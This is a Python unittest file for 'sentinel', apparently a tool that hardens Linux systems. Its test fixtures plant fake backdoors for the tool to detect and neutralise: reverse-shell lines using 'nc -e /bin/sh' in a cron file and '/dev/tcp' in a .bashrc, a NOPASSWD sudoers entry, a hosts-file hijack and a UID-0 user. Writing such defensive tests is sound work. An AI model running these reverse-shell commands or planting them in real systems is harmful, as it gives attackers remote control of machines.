import json
import os
import sys
import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / 'lib'))
import sentinel


class FakeCtx(sentinel.Context):
    packages = ['nmap', 'vim', 'netcat-openbsd', 'john']
    suid = ['/usr/bin/find', '/usr/bin/sudo']
    procs = [(111, '/tmp/evil'), (222, '/usr/bin/python3')]
    statuses = {'carol': 'NP', 'bob': 'P'}

    def installed_packages(self): return self.packages
    def suid_files(self): return self.suid
    def processes(self): return self.procs
    def password_status(self, user): return self.statuses.get(user, 'P')
    def unit_running(self, unit): return unit in ('avahi-daemon', 'vsftpd', 'ssh', 'nginx')


def write(root, rel, text):
    path = Path(root) / rel.lstrip('/')
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text, encoding='utf-8')


class SentinelTests(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.root = Path(self.tmp.name) / 'root'
        self.engine = Path(self.tmp.name) / 'engine'
        (self.engine / 'data').mkdir(parents=True)
        (self.engine / 'data/readme_parsed.json').write_text(json.dumps({
            'all_users': [{'name': 'alice', 'account_type': 'admin'}, {'name': 'bob', 'account_type': 'standard'}],
            'critical_services': ['ssh'], 'recent_hires': []}))
        (self.engine / 'data/auto-source.html').write_text('<p>alice:Pw (YOU)</p><p>Wireshark is NOT allowed</p>')
        write(self.root, '/etc/passwd', 'root:x:0:0::/root:/bin/bash\nalice:x:1000:1000::/home/alice:/bin/bash\nbob:x:1001:1001::/home/bob:/bin/bash\n'
                                         'mallory:x:1002:1002::/home/mallory:/bin/bash\ncarol:x:1003:1003::/home/carol:/bin/bash\ntoor:x:0:0::/root:/bin/sh\n')
        write(self.root, '/etc/group', 'sudo:x:27:alice,bob\n')
        write(self.root, '/etc/hosts', '127.0.0.1 localhost\n6.6.6.6 update.microsoft.com\n')
        write(self.root, '/etc/cron.d/backdoor', '* * * * * root nc -e /bin/sh 10.0.0.1 9\n')
        write(self.root, '/etc/cron.d/e2scrub_all', '0 3 * * * root /x\n')
        write(self.root, '/etc/sudoers.d/90-evil', 'bob ALL=(ALL) NOPASSWD: ALL\n')
        write(self.root, '/home/bob/.bashrc', 'export A=1\nbash -i >& /dev/tcp/1.2.3.4/9 0>&1\nalias sudo=/tmp/x\n')
        write(self.root, '/home/bob/Downloads/hack.sh', 'echo\n')
        write(self.root, '/home/bob/Documents/notes.txt', 'ok\n')
        write(self.root, '/stray.bin', 'x')
        write(self.root, '/home/bob/.mozilla/firefox/abc.default/prefs.js', '// prefs\n')
        (self.root / 'home/alice/Desktop').mkdir(parents=True)
        with patch.dict(os.environ, {'SUDO_USER': 'alice'}):
            self.ctx = FakeCtx(self.engine, self.root)

    def by_cat(self, found):
        out = {}
        for f in found:
            out.setdefault(f.category, []).append(f)
        return out

    def test_scan_classifies_auto_and_review(self):
        cats = self.by_cat(sentinel.scan(self.ctx))
        auto = {f.action[1] for f in cats['hacking-package'] if f.mode == 'auto'}
        self.assertEqual(auto, {'nmap', 'john'})
        self.assertEqual(cats['dual-use-package'][0].mode, 'review')
        self.assertEqual(cats['suid'][0].action, ('chmod', '/usr/bin/find', 'u-s'))
        self.assertEqual(len(cats['suid']), 1)  # sudo's SUID is legitimate
        self.assertEqual(cats['sudoers'][0].mode, 'auto')
        self.assertEqual([f.mode for f in cats['backdoor-line']], ['auto', 'auto'])
        self.assertEqual(cats['empty-password'][0].action, ('lock-user', 'carol'))
        review_texts = ' '.join(f.text for f in sentinel.scan(self.ctx) if f.mode == 'review')
        for needle in ('mallory', 'toor', '/stray.bin', 'backdoor', 'update.microsoft.com', 'hack.sh', 'pid 111'):
            self.assertIn(needle, review_texts)
        for clean in ('notes.txt', 'e2scrub_all', 'pid 222', 'alice'):
            self.assertNotIn(clean, review_texts)

    def test_services_safe_auto_prohibited_review_critical_untouched(self):
        cats = self.by_cat(sentinel.scan(self.ctx))
        self.assertEqual([(f.action[1], f.mode) for f in cats['service-off']], [('avahi-daemon', 'auto')])
        self.assertEqual({f.action[1] for f in cats['prohibited-service']}, {'vsftpd', 'nginx'})
        self.assertTrue(all(f.mode == 'review' for f in cats['prohibited-service']))
        (self.engine / 'data/readme_parsed.json').write_text(json.dumps({'all_users': [], 'critical_services': ['ssh', 'nginx']}))
        again = self.by_cat(sentinel.scan(FakeCtx(self.engine, self.root)))
        self.assertEqual({f.action[1] for f in again['prohibited-service']}, {'vsftpd'})

    def test_readme_mentioned_tool_and_operator_are_protected(self):
        FakeCtx.packages = ['wireshark', 'nmap']
        self.addCleanup(setattr, FakeCtx, 'packages', ['nmap', 'vim', 'netcat-openbsd', 'john'])
        (self.engine / 'data/auto-source.html').write_text('<p>alice:Pw (YOU)</p><p>nmap is allowed</p>')
        ctx = FakeCtx(self.engine, self.root)
        pkgs = {f.action[1] for f in sentinel.scan(ctx) if f.category == 'hacking-package'}
        self.assertEqual(pkgs, {'wireshark'})
        self.assertIn('alice', ctx.protected)

    def test_apply_edits_files_with_backup_and_is_idempotent(self):
        found = {f.category + str(f.action[1:2]): f for f in sentinel.scan(self.ctx)}
        bashrc = next(f for f in sentinel.scan(self.ctx) if f.category == 'backdoor-line' and '.bashrc' in f.text)
        ok, _ = sentinel.apply(self.ctx, bashrc)
        self.assertTrue(ok)
        text = (self.root / 'home/bob/.bashrc').read_text()
        self.assertIn('# [sentinel] bash -i', text)
        self.assertIn('export A=1', text)
        self.assertTrue(list((self.engine / 'data/sentinel-backups').glob('*')))
        sudo = next(f for f in sentinel.scan(self.ctx) if f.category == 'sudoers')
        self.assertTrue(sentinel.apply(self.ctx, sudo)[0])
        self.assertIn('# [sentinel] bob ALL', (self.root / 'etc/sudoers.d/90-evil').read_text())
        rm = next(f for f in sentinel.scan(self.ctx) if f.category == 'loose-root-file')
        self.assertTrue(sentinel.apply(self.ctx, rm)[0])
        self.assertFalse((self.root / 'stray.bin').exists())
        # second pass: the fixed backdoor/sudoers lines are no longer reported
        again = {f.category for f in sentinel.scan(self.ctx)}
        self.assertNotIn('sudoers', again)
        self.assertNotIn('loose-root-file', again)

    def test_userdel_refuses_protected_and_dirs_are_not_removed(self):
        f = sentinel.Finding('x', 'x', ('userdel', 'alice'))
        self.assertFalse(sentinel.apply(self.ctx, f)[0])
        (self.root / 'somedir').mkdir()
        self.assertFalse(sentinel.apply(self.ctx, sentinel.Finding('x', 'y', ('rm', '/somedir')))[0])

    def test_review_items_alert_without_blocking_and_are_fixable_later(self):
        state, lines = {}, []
        with patch.object(sentinel, 'ask', side_effect=AssertionError('must not block')), patch.object(sentinel, 'notify'), \
                patch.object(sentinel, 'apply', return_value=(True, 'ok')):
            auto1, fresh1 = sentinel.one_pass(self.ctx, state, log=lines.append)
        self.assertGreater(fresh1, 0)
        self.assertTrue(any('ALERT' in l for l in lines))
        pending = sentinel.load_pending(self.ctx)
        self.assertTrue(pending)
        self.assertIn('mallory', (self.engine / 'data/sentinel-review.txt').read_text())
        with patch.object(sentinel, 'ask', side_effect=AssertionError('asked')), patch.object(sentinel, 'notify') as popup, \
                patch.object(sentinel, 'apply', return_value=(True, 'ok')):
            auto2, fresh2 = sentinel.one_pass(self.ctx, state, log=lines.append)
        self.assertEqual((auto2, fresh2), (0, 0))
        popup.assert_not_called()  # no repeat popups for the same items
        first = pending[0]
        with patch.object(sentinel, 'apply', return_value=(True, 'ok')) as fix:
            sentinel.save_state(self.ctx, state)
            self.assertEqual(sentinel.run_fix(self.ctx, '1', log=lines.append), 1)
        self.assertEqual(fix.call_args[0][1].text, first['text'])
        self.assertEqual(len(sentinel.load_pending(self.ctx)), len(pending) - 1)
        self.assertEqual(sentinel.run_fix(self.ctx, 'all', dismiss=True, log=lines.append), len(pending) - 1)
        self.assertEqual(sentinel.load_pending(self.ctx), [])

    def test_firefox_profile_hardened_once_and_desktop_report_written(self):
        state, lines = {}, []
        with patch.object(sentinel, 'notify'):
            sentinel.one_pass(self.ctx, state, log=lines.append)
            sentinel.one_pass(self.ctx, state, log=lines.append)
        userjs = (self.root / 'home/bob/.mozilla/firefox/abc.default/user.js').read_text()
        self.assertIn('dom.disable_open_during_load', userjs)
        self.assertEqual(userjs.count('signon.rememberSignons'), 1)  # idempotent
        report = (self.root / 'home/alice/Desktop/SENTINEL-ALERTS.md').read_text()
        self.assertIn('## Needs your eyes', report)
        self.assertIn('mallory', report)
        self.assertIn('## Fixed automatically', report)
        self.assertIn('firefox:', report)

    def test_ask_mode_still_available(self):
        state = {}
        with patch.object(sentinel, 'ask', return_value='\n') as prompt, patch.object(sentinel, 'apply', return_value=(True, 'ok')):
            sentinel.one_pass(self.ctx, state, ask_mode=True, log=lambda *_: None)
        prompt.assert_called_once()

    def test_parse_picks(self):
        self.assertEqual(sentinel.parse_picks('1,3', 5), [0, 2])
        self.assertEqual(sentinel.parse_picks('2-4', 5), [1, 2, 3])
        self.assertEqual(sentinel.parse_picks('all', 3), [0, 1, 2])
        self.assertEqual(sentinel.parse_picks('', 3), [])
        self.assertEqual(sentinel.parse_picks('9, x', 3), [])


if __name__ == '__main__':
    unittest.main()
